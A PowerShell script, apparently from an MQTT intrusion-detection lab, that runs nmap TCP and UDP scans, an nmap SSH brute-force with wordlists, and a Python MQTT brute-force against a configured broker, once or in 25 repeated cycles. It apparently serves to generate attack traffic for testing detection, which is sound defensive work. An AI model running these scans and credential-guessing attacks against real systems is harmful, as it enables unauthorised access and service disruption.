# ============================================================
# MQTT IDS LAB - CLEAN & CONTROLLED ATTACK SCRIPT
# ============================================================

$ProjectRoot = Split-Path $PSScriptRoot -Parent
$ConfigPath  = Join-Path $ProjectRoot "configs/network_config.json"
$NetConfig   = Get-Content $ConfigPath | ConvertFrom-Json

$TARGET = $NetConfig.broker_ip
$ATTACKER = $NetConfig.attacker_ip

$USERS      = Join-Path $PSScriptRoot "users.txt"
$PASSWORDS  = Join-Path $PSScriptRoot "passwords.txt"
$MQTT_BRUTE = Join-Path $PSScriptRoot "mqtt_bruteforce.py"

Write-Host "============================================================" -ForegroundColor Yellow
Write-Host "            MQTT IDS LAB - CONTROLLED ATTACKS               " -ForegroundColor Cyan
Write-Host "============================================================"
Write-Host ""
Write-Host "Target Broker IP: $TARGET" -ForegroundColor Cyan

Write-Host " [1] Run all attacks once"
Write-Host " [2] Run attacks in loop (25 cycles)"
Write-Host " [3] Exit"
Write-Host ""

$choice = Read-Host "Enter your choice"

# -------------------------------------------------------------
# SIMPLE SSH BRUTEFORCE (ONLY PORT 22)
# -------------------------------------------------------------
function Run-SSHBruteforce {
    Write-Host "`n[SSH] Running SSH brute-force on port 22..." -ForegroundColor Yellow

    nmap -p 22 `
        --script ssh-brute `
        --script-args "userdb=$USERS,passdb=$PASSWORDS" `
        $TARGET
}

# -------------------------------------------------------------
# TCP SCAN
# -------------------------------------------------------------
function Run-TCPScan {
    Write-Host "`n[TCP Scan] Running SYN scan on common ports..." -ForegroundColor Yellow
    nmap -sS -p 1-1024 $TARGET
}

# -------------------------------------------------------------
# UDP Scan
# -------------------------------------------------------------
function Run-UDPScan {
    Write-Host "`n[UDP Scan] Running top-50 UDP port scan..." -ForegroundColor Yellow
    nmap -sU --top-ports 50 $TARGET
}

# -------------------------------------------------------------
# MQTT Brute-force
# -------------------------------------------------------------
function Run-MQTTBruteforce {
    Write-Host "`n[MQTT] Running MQTT brute-force..." -ForegroundColor Yellow
    python $MQTT_BRUTE $TARGET
}

# -------------------------------------------------------------
# MENU OPTIONS
# -------------------------------------------------------------
switch ($choice) {

"1" {
    Write-Host "`nRunning ALL attacks once..." -ForegroundColor Green

    Run-TCPScan
    Run-UDPScan
    Run-SSHBruteforce
    Run-MQTTBruteforce
}

"2" {
    $LOOP_COUNT = 25
    Write-Host "`nRunning $LOOP_COUNT cycles..." -ForegroundColor Cyan

    for ($i = 1; $i -le $LOOP_COUNT; $i++) {

        Write-Host "`n===== CYCLE $i/$LOOP_COUNT =====" -ForegroundColor Green

        Run-TCPScan
        Run-UDPScan
        Run-SSHBruteforce
        Run-MQTTBruteforce

        Start-Sleep -Seconds 5
    }
}

"3" {
    Write-Host "Exiting..." -ForegroundColor Yellow
}

default {
    Write-Host "`nInvalid choice." -ForegroundColor Red
}
}

Write-Host "`n============================================================"
Write-Host " ATTACK SCRIPT FINISHED"
Write-Host "============================================================"

Pause
